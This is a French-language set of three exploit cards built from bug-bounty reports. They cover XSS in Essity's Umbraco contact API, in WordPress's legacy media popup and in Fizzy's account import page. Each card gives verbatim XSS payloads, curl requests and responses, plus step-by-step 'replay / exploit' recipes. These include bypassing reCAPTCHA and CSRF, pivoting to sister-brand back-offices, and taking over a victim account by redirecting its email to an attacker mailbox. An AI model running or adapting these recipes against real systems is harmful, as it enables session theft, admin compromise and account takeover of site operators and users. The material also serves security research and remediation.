# Fiches SSS — XSS — Reflected to Zero-Click ATO

*3 fiches exploitables issues du corpus 2025-2026 — chaque extrait « Preuve technique » est copié verbatim de la source brute indiquée.*

### Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3729501)

Les endpoints ContactApi d'Essity (`SavePersonalContactExtended` / `SaveProductContactExtended`) acceptent des tickets non authentifiés contenant du HTML/JavaScript arbitraire dans 12+ champs, en contournant la vérification reCAPTCHA (côté client uniquement), le CSRF et tout rate limiting (8 tickets en 2 s). Quand un opérateur ouvre le ticket dans le back-office Umbraco, le XSS stocké s'exécute dans sa session : vol de session, création de comptes admin, installation de paquets (RCE). `SiteId` n'étant pas contrôlé, l'attaquant peut viser les back-offices des marques sœurs.

**Cause racine :** les endpoints ContactApi persistent sans assainissement des champs HTML/JS fournis par des soumissions non authentifiées ; la protection reCAPTCHA n'existe que côté client et aucune vérification d'autorisation n'est faite sur `SiteId`.

**Preuve technique (verbatim depuis la source) :**

```
- `POST https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/`
- `POST https://████████/Umbraco/Api/ContactApi/SaveProductContactExtended/`
- `POST https://████████/Umbraco/Api/ContactApi/SaveAttachment`
```
```
  --data-urlencode 'FirstName=<img src=x onerror="alert(document.domain)">' \
  --data-urlencode 'LastName=<svg/onload=alert(document.domain)>' \
  --data-urlencode 'Email="<script>alert(1)</script>"@example.com' \
  ...
  --data-urlencode 'ReCaptcha=' \
```
```
{"success":true,"message":"","log":null,"redirect":false,"redirectUrl":null}
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte (soumission anonyme acceptée, « zero cookies ») ; des opérateurs consultent les tickets dans le back-office Umbraco.
- Étapes : 1. (optionnel) déposer une pièce jointe non authentifiée via `SaveAttachment` — la réponse est un nom de fichier préfixé d'un UUID 2. `POST` sur `SavePersonalContactExtended/` avec les payloads XSS dans les champs, un `SiteId`/`CultureId` valides et `ReCaptcha=` vide 3. dès qu'un opérateur ouvre le ticket, le JS s'exécute dans sa session 4. (pivot) changer `SiteId` pour injecter dans le back-office d'une autre marque.
- Pièges / limites : hôte masqué (████████) et chemins dépendants de la locale (`/de/kontakt/`, `/at`, `/bg`, …) ; exécution conditionnée à l'ouverture du ticket par un opérateur ; `SiteId` doit être un tenant valide (énumérable via CountryPicker).

**Reproductibilité :** moyenne — aucun compte requis et recette complète, mais hôte masqué et dépendance à l'ouverture du ticket par un opérateur.

**Techniques :** stored xss, client-side-only recaptcha, missing csrf token, missing rate limit, multi-tenant siteid pivot, html injection in crm backoffice

**Correspond aux classes qualifiantes :** xss, stored-xss, ato, csrf

**Signal (endpoints/fonctions observés) :**
- `POST /Umbraco/Api/ContactApi/SavePersonalContactExtended/`, `POST /Umbraco/Api/ContactApi/SaveProductContactExtended/`
- `POST /Umbraco/Api/ContactApi/SaveAttachment` (upload anonyme)
- `GET /umbraco/Surface/CountryPickerSurface/CountryModal?siteId=<id>` (énumération de tenants)
- `Access-Control-Allow-Origin: *` sans cookie requis (soumissions drive-by possibles)
- back-office Umbraco (exécution au rendu du ticket)

**Paramètres impliqués :** `SiteId`, `CultureId`, `ReCaptcha`, `FirstName`, `LastName`, `Message`, `Phone`, `Question`, `PageUrl`, `UserAgent`, `AttachmentFilename[0]`, `ProvidedConsumerConsents[0][Id]`

---

### Author → stored XSS in wp-admin via unescaped sub-size filename in get_media_item()

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3931771)

`finalize_item()` stocke `sub_sizes[].file` telle quelle dans `_wp_attachment_metadata['sizes'][<name>]['file']` (pas de `sanitize_file_name()`, pas de `validate_callback`) ; `image_get_intermediate_size()` concatène cette valeur brute dans l'URL de l'image et `get_media_item()` l'imprime dans un attribut `src` à quotes simples, sans échappement. Un nom de fichier contenant `'` referme l'attribut et l'élément `<img>` et injecte du markup arbitraire. Un compte Author (`upload_files` + `edit_post` sur sa pièce jointe, sans `unfiltered_html`) piège son thumbnail ; toute la médiathèque étant listée, la payload s'exécute chez chaque administrateur ouvrant la popup média legacy — exécution confirmée en Chromium headless (`TITLE: "XSS-EXECUTED-localhost"`).

**Cause racine :** valeur `sub_sizes[].file` écrite sans normalisation, concaténée dans une URL puis imprimée sans `esc_url()`/`esc_attr()` dans l'attribut `src` de `get_media_item()` — primitive d'écriture REST non filtrante + sink d'affichage historique non échappé.

**Preuve technique (verbatim depuis la source) :**

```
{"sub_sizes":[{"image_size":"thumbnail",
  "file":"a.jpg' /><svg onload='document.title=\"XSS-EXECUTED-\"+document.domain'></svg><b x='",
  "width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}
```
```
curl -b author.jar -H "X-WP-Nonce: $N" -X POST -H "Content-Type: application/json" \
     --data-binary @xss.json "$B/?rest_route=/wp/v2/media/8/finalize"        # 200
...
curl -b admin.jar "$B/wp-admin/media-upload.php?tab=library"                 # 200
```
```
class='thumbnail' src='http://localhost:8356/wp-content/uploads/2026/07/a.jpg' /><svg onload='document.title="XSS-EXECUTED-"+document.domain'></svg><b x='' alt='' /></a></p>
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte Author (`upload_files` + `edit_post`, sans `unfiltered_html`) ; WordPress 7.0.2 + Gutenberg 23.6.0, ou trunk ; un administrateur ouvre `GET /wp-admin/media-upload.php?tab=library` (GET sans nonce, gaté par `upload_files`).
- Étapes : 1. uploader un vrai JPEG (`POST /?rest_route=/wp/v2/media`, cookie + `X-WP-Nonce`) 2. `POST` de `xss.json` sur `/?rest_route=/wp/v2/media/<id>/finalize` (HTTP 200, valeur stockée verbatim) 3. l'admin ouvre la popup média legacy : la valeur est rendue brute et le `<svg onload>` s'exécute dans l'origine `wp-admin`.
- Pièges / limites : seul le chemin legacy rend la valeur brute (`media-upload.php?tab=library`, `media_upload_gallery_form()` / `media_upload_type_form()`) — `upload.php`, `upload.php?mode=list` et `post.php` échappent la valeur ; l'attaquant doit posséder la pièce jointe (pas d'IDOR) ; post-exploitation argumenté, non exécuté dans le rapport.

**Reproductibilité :** moyenne — chaîne complète rejouée en labo (trunk + Gutenberg), mais nécessite un compte Author, la version/plugin portant l'écriture, et l'ouverture de la popup legacy par un admin.

**Techniques :** stored xss, rest api attachment metadata poisoning, attribute breakout, unescaped output, author-to-admin privilege escalation

**Correspond aux classes qualifiantes :** xss, stored-xss, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `POST /?rest_route=/wp/v2/media` puis `POST /?rest_route=/wp/v2/media/<id>/finalize`
- `GET /wp-admin/media-upload.php?tab=library` (GET sans nonce)
- `finalize_item()` (`class-wp-rest-attachments-controller.php`, `file` non assaini)
- `image_get_intermediate_size()` (`wp-includes/media.php`)
- `get_media_item()` (`wp-admin/includes/media.php`, attribut `src` non échappé)

**Paramètres impliqués :** `sub_sizes[].file`, `sub_sizes[].image_size` (`thumbnail`), `width`, `height`, `mime_type`, en-tête `X-WP-Nonce`

---

### DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3608199)

La page d'import de comptes de Fizzy rend le nom du fichier local sélectionné avec `innerHTML` au lieu de `textContent`, dans le formulaire d'import authentifié `/account/imports/new`. Un nom de fichier `.zip` forgé est interprété comme du HTML et injecte un second bouton de soumission avec `formaction`/`formmethod` choisis par l'attaquant : le formulaire, qui contient déjà la session de la victime et un jeton CSRF valide, devient un gadget de requêtes authentifiées. Chaîne démontrée jusqu'au takeover : changement d'adresse e-mail vers une boîte attaquante, récupération du lien de confirmation, nouvelle session victime (`Set-Cookie: session_token=...`), accès `200 OK` au compte et à la page d'édition du profil. Impacts secondaires validés : création de jeton d'accès personnel (write) et suppression du compte victime.

**Cause racine :** rendu du nom de fichier via `innerHTML` dans un formulaire authentifié contenant déjà un jeton CSRF — l'élément injecté détourne la soumission du formulaire (`formaction`/`formmethod`) et rejoue le CSRF de la page.

**Preuve technique (verbatim depuis la source) :**

```
<button formaction=&#47;40002&#47;users&#47;03frq8zae2a7m9cari0v89xua&#47;email_addresses formmethod=post name=email_address value=attacker@example.com>Take over.zip
```
```
POST /40002/users/03frq8zae2a7m9cari0v89xua/email_addresses
```
```
HTTP/1.1 302 Found
Location: http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/edit
Set-Cookie: session_token=...; httponly; samesite=lax
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : instance Fizzy buildée sur le commit validé (`4211e20a663eb5ad8d4ca3340a1f8d247472c4dc`) ou cible équivalente ; victime authentifiée (propriétaire de compte) qui ouvre la page d'import ; boîte mail de l'attaquant pour recevoir la confirmation.
- Étapes : 1. créer un fichier local dont le nom contient le bouton injecté 2. faire ouvrir `/account/imports/new` à la victime et sélectionner le fichier 3. la victime clique sur le contrôle injecté → `POST /<slug>/users/<uid>/email_addresses` (`email_address=attacker@example.com`, session et CSRF réels) 4. récupérer l'e-mail « Confirm your new email address » 5. visiter l'URL de confirmation et soumettre le formulaire → nouveau `session_token` 6. accéder au compte victime (`GET /40002/`, `GET /40002/users/<uid>/edit` → 200).
- Pièges / limites : interaction victime requise (sélection du fichier + clic) ; les identifiants (`/40002`, `03frq8zae2a7m9cari0v89xua`) sont propres au labo de la source ; le nom forgé doit être livré en pièce jointe.

**Reproductibilité :** moyenne — payload et étapes complets, mais nécessite une instance Fizzy (ou victime authentifiée), une boîte mail contrôlée et l'ouverture de la page d'import par la victime (la source caractérise la chaîne comme « single click » / « single user interaction » sur cette page).

**Techniques :** dom xss, innerhtml sink, formaction hijack, csrf token reuse, email change to attacker mailbox, account takeover

**Correspond aux classes qualifiantes :** xss, dom-xss, ato, csrf

**Signal (endpoints/fonctions observés) :**
- `GET /account/imports/new` (aperçu du nom de fichier via `innerHTML`)
- `app/javascript/controllers/upload_preview_controller.js`, `app/views/account/imports/new.html.erb`
- `POST /<slug>/users/<user_id>/email_addresses`
- `POST /<slug>/my/access_tokens`, `POST /<slug>/account/cancellation`

**Paramètres impliqués :** nom du fichier local (`formaction`, `formmethod` injectés), `email_address`, `authenticity_token`
